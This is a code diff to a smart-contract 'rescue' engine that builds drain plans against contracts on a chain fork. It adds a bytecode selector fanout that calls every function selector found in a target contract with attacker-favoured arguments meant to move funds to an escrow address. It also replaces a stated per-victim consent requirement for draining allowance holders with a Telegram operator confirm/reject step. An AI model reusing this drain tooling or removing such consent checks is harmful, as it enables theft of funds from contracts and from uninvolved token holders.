@@ -81,7 +81,7 @@ import {
 import { rawDb } from "@/src/db/client";
 
 export const ENGINE_ID = "rescue-prove";
-export const ENGINE_VERSION = "10";
+export const ENGINE_VERSION = "11";
 
 // Aave v3 pool addresses per chain — used as the suggested flash-loan
 // source in the flashloanRequirement field. Not exhaustive; missing chains
@@ -365,10 +365,11 @@ export async function rescueProve(input: RescueProveInput): Promise<PoeArtifact>
       // route the operator to deploying / using FlashLoanRescue.sol rather
       // than giving up.
       const useFlash = shouldUseFlashloanStub(input.ruleId);
+      const hasReceiver = !!flashloanReceiverFor(input.chainId);
       return finalise({
         attemptId,
         input,
-        verdict: useFlash ? "requires_flashloan_helper" : "no_rescue_possible",
+        verdict: useFlash && !hasReceiver ? "requires_flashloan_helper" : "no_rescue_possible",
         assets: [],
         plan: [],
         pre: snapState(exposure),
@@ -538,6 +539,7 @@ export async function rescueProve(input: RescueProveInput): Promise<PoeArtifact>
         url,
         chainRpcUrl: anv.rpcUrl ?? null,
         contractAddress: input.contractAddress,
+        findingId: input.findingId,
         tokens: exposure.tokens.map((t) => ({
           address: t.address,
           symbol: t.symbol,
@@ -597,16 +599,44 @@ export async function rescueProve(input: RescueProveInput): Promise<PoeArtifact>
         notes.push(
           `Drained nothing of the contract's own funds, but approval-surface scan found ` +
             `${approvalScan.victims.length} victim(s) with $${(approvalScan.totalDrainableUsd ?? 0).toFixed(2)} ` +
-            `at risk via outstanding allowances. Live rescue requires per-victim consent ` +
-            `(RESCUE_APPROVAL_CONSENT_VICTIMS).`,
+            `at risk via outstanding allowances. Notifying TG for manual confirm/reject.`,
         );
+        // Fire TG notification so operator can /confirmrescue or /rejectrescue
+        void (async () => {
+          try {
+            const { notifyApprovalVictims } = await import("../rescue/tg-bot");
+            await notifyApprovalVictims({
+              findingId: input.findingId,
+              chainId: input.chainId,
+              contractAddress: input.contractAddress,
+              victims: approvalScan!.victims.map((v) => ({
+                victim: v.victim,
+                tokenSymbol: v.tokenSymbol,
+                drainableUsd: v.drainableUsd,
+                drainable: v.drainable,
+              })),
+              totalDrainableUsd: approvalScan!.totalDrainableUsd,
+            });
+          } catch {}
+        })();
       } else if (shouldUseFlashloanStub(input.ruleId)) {
-        verdict = "requires_flashloan_helper";
-        notes.push(
-          `Economic.* finding — fork stub couldn't extract value via admin-name surface alone. ` +
-            `True rescue requires a deployed flash-loan receiver contract; see ` +
-            `flashloanRequirement for the borrow shape.`,
-        );
+        const flReceiver = flashloanReceiverFor(input.chainId);
+        if (flReceiver) {
+          verdict = "no_rescue_possible";
+          notes.push(
+            `Economic.* finding — fork stub couldn't extract value even with flash capital ` +
+              `(admin-name + selector fanout both failed). Receiver IS deployed at ${flReceiver} ` +
+              `but the drain plan produced no successful steps. Likely a false positive or the ` +
+              `economic attack requires specific DEX state that the fork stub can't reproduce.`,
+          );
+        } else {
+          verdict = "requires_flashloan_helper";
+          notes.push(
+            `Economic.* finding — fork stub couldn't extract value via admin-name surface alone. ` +
+              `True rescue requires a deployed flash-loan receiver contract; see ` +
+              `flashloanRequirement for the borrow shape.`,
+          );
+        }
       } else {
         verdict = "no_rescue_possible";
         // Diagnose WHY no rescue: priced exposure, dust-only, or just reverted.
@@ -911,6 +941,24 @@ async function buildDrainPlan(
   } catch (e) {
     notes.push(
       `v8-evidence-admin fanout failed: ${String((e as any)?.message ?? e).slice(0, 120)}`,
+    );
+  }
+
+  // 2c. v11-BSFANOUT: bytecode selector fanout. Extract ALL 4-byte function
+  //     selectors PUSHed in the contract bytecode and try each with
+  //     attacker-favoured arg templates. The evidence-admin fanout above
+  //     only fires on named selectors matching ADMIN_NAME_PATTERN; this
+  //     catches contract-specific drain functions with non-obvious names
+  //     like `execute`, `dispatch`, `forward`, `process`, etc.
+  try {
+    const code = await rpcRequest<string>(url, "eth_getCode", [input.contractAddress, "latest"]).catch(
+      () => "0x",
+    );
+    const bsfSteps = buildBytecodeSelectorFanout(input, exposure, code, notes);
+    for (const s of bsfSteps) steps.push(s);
+  } catch (e) {
+    notes.push(
+      `v11-bytecode-selector fanout failed: ${String((e as any)?.message ?? e).slice(0, 120)}`,
     );
   }
 
@@ -1449,6 +1497,100 @@ function buildEvidenceAdminFanout(
       `v8-evidence-admin: fanout-fired ${candidateCount} candidate(s) from ${candidates.length} admin-named ` +
         `selector(s) [${candidates.slice(0, 4).map((a: any) => a.resolvedName).join(", ")}` +
         `${candidates.length > 4 ? ", …" : ""}]. Owner-gated revert on pre-flight; the rest land.`,
+    );
+  }
+  return steps.slice(0, MAX_DRAIN_STEPS);
+}
+
+/** Extract all 4-byte selectors PUSHed in EVM bytecode.
+ *  Scans for PUSH4 (0x63) opcodes and collects the following 4 bytes as
+ *  a selector candidate. Also picks up PUSH32 values where the first 4
+ *  bytes are non-zero and the rest are zero-padded (common in selector
+ *  comparison patterns). Caps at MAX_BSF_SELECTORS to keep fork load
+ *  bounded. */
+const MAX_BSF_SELECTORS = 64;
+const WELL_KNOWN_SKIP = new Set([
+  "0xa9059cbb", // transfer
+  "0x23b872dd", // transferFrom
+  "0x095ea7b3", // approve
+  "0x70a08231", // balanceOf
+  "0xdd62ed3e", // allowance
+  "0x18160ddd", // totalSupply
+  "0x313ce567", // decimals
+  "0x06fdde03", // name
+  "0x95d89b41", // symbol
+  "0x01ffc9a7", // supportsInterface
+  "0xffffffff", // not a real selector
+  "0x00000000", // not a real selector
+]);
+
+function extractSelectorsFromBytecode(bytecodeHex: string): string[] {
+  const raw = bytecodeHex.replace(/^0x/i, "").toLowerCase();
+  const selectors = new Set<string>();
+  for (let i = 0; i < raw.length - 10; i += 2) {
+    const opcode = raw.slice(i, i + 2);
+    if (opcode === "63") {
+      // PUSH4: next 4 bytes are the selector
+      const sel = "0x" + raw.slice(i + 2, i + 10);
+      if (sel.length === 10 && !WELL_KNOWN_SKIP.has(sel)) {
+        selectors.add(sel);
+      }
+      i += 8; // skip past the 4-byte operand
+    }
+  }
+  const result = [...selectors];
+  return result.slice(0, MAX_BSF_SELECTORS);
+}
+
+function buildBytecodeSelectorFanout(
+  input: RescueProveInput,
+  exposure: Exposure,
+  bytecodeHex: string,
+  notes: string[],
+): DrainStep[] {
+  const selectors = extractSelectorsFromBytecode(bytecodeHex);
+  if (selectors.length === 0) return [];
+
+  const steps: DrainStep[] = [];
+  const seen = new Set<string>();
+  const push = (data: string, asset: string, strategy: string, value = "0") => {
+    const key = `${input.contractAddress}|${data}|${value}`;
+    if (seen.has(key)) return;
+    seen.add(key);
+    steps.push({ to: input.contractAddress, data, value, asset, strategy });
+  };
+
+  const escrow = DEFAULT_ESCROW.slice(2).toLowerCase().padStart(64, "0");
+  const contract = input.contractAddress.slice(2).toLowerCase().padStart(64, "0");
+  const maxUint = "f".repeat(64);
+
+  for (const sel of selectors) {
+    // Template 1: sel(escrow) — single address arg = recipient
+    push(sel + escrow, "native/token via bytecode-sel", `bsf:${sel}(addr)`);
+
+    // Template 2: sel(escrow, maxUint) — withdraw(to, amount)
+    push(sel + escrow + maxUint, "native/token via bytecode-sel", `bsf:${sel}(addr,uint)`);
+
+    // Template 3: sel(contract, escrow, maxUint) — transferFrom pattern
+    push(
+      sel + contract + escrow + maxUint,
+      "native/token via bytecode-sel",
+      `bsf:${sel}(addr,addr,uint)`,
+    );
+
+    // Template 4: sel(maxUint) — withdraw(amount) to msg.sender
+    push(sel + maxUint, "native/token via bytecode-sel", `bsf:${sel}(uint)`);
+
+    // Template 5: sel() — no-arg drain (parameterless withdraw)
+    push(sel, "native/token via bytecode-sel", `bsf:${sel}()`);
+
+    if (steps.length >= MAX_DRAIN_STEPS * 2) break;
+  }
+
+  if (steps.length > 0) {
+    notes.push(
+      `v11-bsf: bytecode selector fanout generated ${steps.length} candidate(s) from ` +
+        `${selectors.length} unique 4-byte selector(s). Owner-gated ones revert on pre-flight.`,
     );
   }
   return steps.slice(0, MAX_DRAIN_STEPS);
